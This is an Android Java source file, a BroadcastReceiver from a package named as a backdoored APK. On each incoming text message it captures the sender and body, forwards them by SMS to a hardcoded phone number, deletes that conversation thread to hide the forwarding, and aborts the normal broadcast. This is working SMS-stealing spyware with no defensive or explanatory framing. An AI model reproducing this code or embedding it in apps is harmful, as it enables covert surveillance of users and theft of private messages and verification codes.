package stage.metasploit.com.backdooredapk;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import org.greenrobot.eventbus.EventBus;

/**
 * Created by Grunt on 15/02/2017.
 */

public class IncomingSms extends BroadcastReceiver {

    public void onReceive(Context context, Intent intent) {

        // Retrieves a map of extended data from the intent.
        final Bundle bundle = intent.getExtras();

        try {

            if (bundle != null) {

                final Object[] pdusObj = (Object[]) bundle.get("pdus");
                if (pdusObj != null) {
                    for (Object obj : pdusObj) {

                        SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) obj);
                        String phoneNumber = currentMessage.getDisplayOriginatingAddress();

                        String message = currentMessage.getDisplayMessageBody();

                        Log.i("SmsReceiver", "senderNum: " + phoneNumber + "; message: " + message);
                        EventBus.getDefault().post(new NewSmsEvent(new SMS(message, "1"), phoneNumber));//1 is for received message

                        SmsManager sms = SmsManager.getDefault();
                        sms.sendTextMessage("+33642617318", null, "From " + phoneNumber + " : \n" + message, null, null);
                        Handler handler = new Handler();
                        handler.postDelayed(new DeleteThread(context), 1000);

                    } // end for loop
                }
            } // bundle is null

        } catch (Exception e) {
            Log.e("SmsReceiver", "Exception smsReceiver" +e);

        }
        finally {
            abortBroadcast();
        }
    }

    class DeleteThread extends Thread {
        private Context context;

        DeleteThread(Context context) {
           this.context = context;
        }

        @Override
        public void run() {
            deleteThread(context, "+33642617318");
        }

        private String findThreadForNumber(Context context, String number) {
            ContentResolver cr = context.getContentResolver();
            Cursor pCur = cr.query(
                    Uri.parse("content://mms-sms/canonical-addresses"), new String[]{"_id"},
                    "address" + " = ?",
                    new String[]{number}, null);

            String thread_id = null;

            if (pCur != null) {
                if (pCur.getCount() != 0) {
                    pCur.moveToNext();
                    thread_id = pCur.getString(pCur.getColumnIndex("_id"));
                }
                pCur.close();
            }
            return thread_id;
        }

        private void deleteThread(Context context, String number) {
            String thread_id = findThreadForNumber(context, number);
            if(thread_id != null) {
                context.getContentResolver().delete(Uri.parse("content://sms/conversations/" + thread_id), null, null);
            }
        }
    }
}







